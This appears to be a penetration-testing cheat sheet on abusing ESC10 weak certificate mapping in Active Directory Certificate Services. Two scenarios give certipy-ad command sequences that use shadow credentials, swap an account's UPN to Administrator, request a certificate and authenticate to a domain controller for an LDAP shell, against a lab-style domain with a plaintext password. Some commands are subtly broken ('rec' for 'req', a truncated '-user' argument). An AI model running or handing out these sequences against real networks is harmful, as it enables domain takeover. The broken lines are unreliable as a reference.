# General Overview: 

Exploiting ESC10 in AD CS involves taking advantage of weak certificate mapping configurations that allow low-privileged users to obtain certificates capable of high-privilege impersonation. In environments where ESC10 is present, attackers can request certificates that lack proper security extensions, such as the `szOID_NTDS_CA_SECURITY_EXT`. 

These certificates can then be used to authenticate as privileged accounts, like domain controllers, enabling the attacker to escalate privileges and potentially compromise the entire domain. 

This attack is particularly effective when the `StrongCertificateBindingEnforcement` setting is not strictly enforced, allowing certificates with weak or absent security extensions to be accepted by Kerberos or Schannel.

## Requirements: 

- StrongCertificateBindingEnforcement set to 0
- GenericWrite over any account A to compromise any account B
 

# Abusing ESC10  Certificate Templates

## Scenario 1: 

## Certipy

- certipy-ad shadow auto -username afsimmons@megacorpone.com -p Spawn123! -account xadmin
- certipy-ad account update -username afsimmons@megacorpone.com -p Spawn123! -user xadmin -upn Administrator
- certipy-ad rec -CA 'corp-DC-CA' -username xadmin@megacorpone.com -hashes "NT HASH"
- certipy-ad account update -username afsimmons@megacorpone.com -p Spawn123! -user 

## Scenario 2:

- certipy-ad shadow auto -username afsimmons@megacorpone.com -p Spawn123! -account xadmin
- certipy-ad account update -username afsimmons@megacorpone.com -p Spawn123! -user xadmin -upn Administrator
- certipy-ad req -username xadmin@megacorpone.com -hash "NT-HASH" -CA 'corp-DC-CA' -template 'Vuln Template'
- certipy-ad account update -username afsimmons@megacorpone.com -p Spawn123! -user xadmin -upn xadmin@megacorpone.com
- certipy-ad auth -pfx dc.pfx -dc-ip 172.21.1.5 -ldap-shell